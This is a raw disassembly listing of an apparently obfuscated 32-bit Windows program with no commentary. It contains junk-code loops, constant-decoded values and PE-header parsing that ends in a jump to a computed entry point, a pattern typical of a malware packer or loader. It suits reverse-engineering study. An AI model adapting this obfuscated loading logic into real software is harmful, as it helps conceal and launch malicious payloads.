  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e872
  40934d:	adc    edx,DWORD PTR ds:0x4305c2
  409353:	mov    DWORD PTR ds:0x42e872,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42ef2c,0x0
  409369:	mov    edi,DWORD PTR ds:0x42ef2c
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42ef2c,edi
  409376:	cmp    DWORD PTR ds:0x42ef2c,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e866
  40938b:	call   DWORD PTR ds:0x42ecb4
  409391:	cmp    DWORD PTR ds:0x42ef2c,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42ef2c
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42ef2c,edi
  4093ad:	cmp    DWORD PTR ds:0x42ef2c,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x4305b2,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42ef28,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42ef28
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42ef28,edi
  4093e2:	cmp    DWORD PTR ds:0x42ef28,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42ef28,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ebd0
  409402:	cmp    DWORD PTR ds:0x42ef28,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42ef28
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42ef28,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef0c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef0c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef0c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ebb4
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef0c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef0c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x43065a
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43058a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43059e
  409480:	adc    edi,DWORD PTR ds:0x42ef18
  409486:	mov    DWORD PTR ds:0x43059e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ef30,0x42e86a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ef20,0x4305ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4305c2
  4094b1:	and    DWORD PTR ds:0x4305be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e876,0x43059a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4305a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ef2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ef2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ef2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ecb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ef2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ef2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e86a
  409527:	or     edi,DWORD PTR ds:0x43063e
  40952d:	mov    DWORD PTR ds:0x42e86a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4305a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43059a
  40955e:	sbb    DWORD PTR ds:0x42ef0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ef24,0x19
  409570:	cmp    DWORD PTR ds:0x42ef24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ef24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ebb8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ef24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ef24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e85e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e85e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e85e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e85e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e85e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ecbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e862,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4305a2
  409649:	sub    DWORD PTR ds:0x43058a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ef2c,0x4305a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4305aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e86e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e85e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e85e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e85e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ebd4
  4096b3:	cmp    DWORD PTR ds:0x42e85e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e85e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e85e,eax
  4096cb:	mov    eax,ds:0x42e85e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e85e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ef24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ef24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ef24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ef24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ef24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430592
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ecc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43058a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ef2c
  409763:	call   DWORD PTR ds:0x42ecc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4305ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43064e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef18
  4097a8:	sub    DWORD PTR ds:0x42e862,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430646
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e85a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e85a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e85a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e85a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430656
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ebd8
  4097f0:	cmp    DWORD PTR ds:0x42e85a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e85a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e85a,edx
  40980a:	cmp    DWORD PTR ds:0x42e85a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430642,0x1c
  40982b:	cmp    DWORD PTR ds:0x430642,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430642,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ecc8
  409850:	cmp    DWORD PTR ds:0x430642,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430642
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430642,edx
  40986a:	mov    edx,DWORD PTR ds:0x430642
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430642,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43064a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4305a2,0x42e872
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4305ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4305ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4305ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4305ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4305ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42eccc
  4098eb:	cmp    DWORD PTR ds:0x4305ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4305ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4305ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4305c2,0x4305a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef1c,0x42e86e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef14
  409945:	inc    eax
  409946:	mov    ds:0x42ef14,eax
  40994b:	cmp    DWORD PTR ds:0x42ef14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ebe0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43059e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e85e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4305c2
  409998:	xor    ecx,DWORD PTR ds:0x4305be
  40999e:	mov    DWORD PTR ds:0x4305c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4305b6,0x42ef14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e86a,0x42ef08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4305ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4305b2,0x4305c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e85e,0x42e86a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e872,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430646,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e85a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430586,0x430652
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e85e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43065a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e86e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e86e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43059a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e85e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43064e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4305be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43065a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43064a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430652,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef0c,0x42e85e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4305ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430646,0x42ef28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e86a,0x43059a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4305aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e85e,0x43064e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4305c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ef28,0x430596
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ef24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430586,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430596
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4305a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43058e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4305ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4305a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e876,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4305be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430642,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430646,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430646,0x42ef0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
